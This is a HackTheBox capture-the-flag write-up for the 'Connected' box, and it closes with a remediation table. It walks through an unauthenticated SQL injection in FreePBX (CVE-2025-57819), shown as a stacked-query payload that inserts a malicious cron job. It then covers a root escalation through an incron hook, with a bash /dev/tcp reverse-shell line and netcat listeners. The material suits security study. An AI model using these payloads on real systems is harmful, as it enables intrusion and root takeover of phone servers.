# HackTheBox — Connected

**Author:** Obito Uchiha — Team AKATSUKI **Target:** `10.129.245.100` (connected.htb) **Difficulty:** Easy/Medium **Category:** Web Exploitation → Unauthenticated SQL Injection → RCE → Linux Privilege Escalation

---

## 1. Overview

Connected is a Linux box running **FreePBX 16.0.40.7**, which is vulnerable to **CVE-2025-57819**, an unauthenticated SQL injection in the Endpoint module that allows stacked queries. By abusing stacked queries to insert a malicious entry into the `cron_jobs` table, an attacker achieves remote code execution as the `asterisk` user. Privilege escalation to root is achieved by abusing an `incron` rule that watches `/var/spool/asterisk/sysadmin/dahdi_restart` and runs `/usr/sbin/sysadmin_dahdi_restart`, a root-owned script that sources the asterisk-writable file `/etc/dahdi/init.conf`.

---

## 2. Reconnaissance

```
nmap -sC -sV -p- 10.129.245.100
```

|Port|Service|Notes|
|---|---|---|
|22|ssh|OpenSSH|
|80|http|FreePBX portal|
|443|https|FreePBX portal (TLS)|

Browsing port 80 revealed a **FreePBX 16.0.40.7** administration portal, which is publicly known to be affected by **CVE-2025-57819** (listed in CISA's Known Exploited Vulnerabilities catalog).

---

## 3. Initial Foothold — CVE-2025-57819

### 3.1 Vulnerability Summary

The FreePBX Endpoint module fails to sanitize the `brand` parameter before concatenating it into a SQL query. Because the backend database permits **stacked queries**, an attacker can terminate the original query and append an arbitrary `INSERT` statement directly — no authentication required.

### 3.2 Exploitation Chain

1. Confirm the injection point is vulnerable to stacked queries (a SQL syntax error on malformed `brand` input confirms direct string concatenation).
    
2. Inject an `INSERT` into the `cron_jobs` table that FreePBX polls once per minute:
    
    ```sql
    x'; INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
    VALUES ('sysadmin', 'pwn', '<reverse-shell-command>', NULL, '* * * * *', 30, 1, 1) -- -
    ```
    
3. Within ~60 seconds, the inserted cron job executes as the `asterisk` service user.
    

### 3.3 Tooling Used

Public PoC: [`Its1Zero/cve-2025-57819-exploit`](https://github.com/Its1Zero/cve-2025-57819-exploit)

```bash
# Listener
nc -lnvp 4444

# Exploit (note: pass bare hostname, not a full URL)
python3 exploit.py connected.htb 10.10.14.254 4444
```

A common mistake here is passing `http://connected.htb/admin/` as the target — the script expects a bare hostname and internally builds the request path to `/admin/ajax.php`.

### 3.4 Shell Stabilization

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**User flag:** `c81884844c4c56e60da63462bcccb8e1`

---

## 4. Privilege Escalation — incron Abuse

### 4.1 Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

The SUID listing was standard for CentOS 7, except for `/usr/bin/incrontab`, which hinted at an `incron`-based privesc path.

```bash
cat /etc/incron.d/* 2>/dev/null
```

```
/var/spool/asterisk/sysadmin/vpnget                IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron    IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup        IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart     IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart         IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger                     IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron                         IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron    IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
```

These rules are root-owned (`incrond` runs as root). Writing to any watched file as `asterisk` triggers the corresponding root action on `IN_CLOSE_WRITE`.

> **Note:** An earlier attempt to abuse the `sysadmin_manager` / `fwconsole-commands` hook (via a crafted `api.fwconsole-commands.<base64(zlib(json))>` filename) did not fire. `ps aux | grep incron` showed no running `incrond` process bound to that rule path at the time, so that avenue was abandoned in favor of the confirmed `dahdi_restart` path below.

### 4.2 Exploitation

`/usr/sbin/sysadmin_dahdi_restart` ultimately runs `/etc/init.d/dahdi restart`, which **sources** `/etc/dahdi/init.conf`. That file was writable by `asterisk`.

```bash
# Confirm writability
ls -la /etc/dahdi/init.conf

# Listener on attack box
nc -lvnp 4445

# Append a reverse shell payload to the sourced config file
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.254/4445 0>&1" &' >> /etc/dahdi/init.conf

# Trigger the watched file
echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart
```

Within seconds, `incrond` fires the root-owned restart script, which sources the modified config and executes the appended shell command as root.

### 4.3 Root

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# 5174b7266e75c0cdd4c0a6200dd9c262
```

---

## 5. Root Cause & Remediation

|Issue|Fix|
|---|---|
|CVE-2025-57819 (unauthenticated SQLi → stacked queries → cron RCE)|Upgrade FreePBX Endpoint module to 15.0.66 / 16.0.89 / 17.0.3+|
|`asterisk`-writable `/etc/dahdi/init.conf` sourced by a root-triggered `incron` action|Remove write permission for the `asterisk` user on configuration files sourced by privileged scripts; avoid sourcing files from service-account-writable paths in root-run hooks|

---

## 6. Summary Timeline

1. Recon → FreePBX 16.0.40.7 identified on port 80.
2. CVE-2025-57819 unauthenticated SQLi → stacked query → malicious `cron_jobs` entry → RCE as `asterisk`.
3. Shell stabilized; `user.txt` captured.
4. Enumerated `/etc/incron.d/*`; identified root-triggered `dahdi_restart` hook.
5. Abused asterisk-writable `/etc/dahdi/init.conf` sourced by the root script → reverse shell as root.
6. `root.txt` captured.

— _Obito Uchiha, Team AKATSUKI_
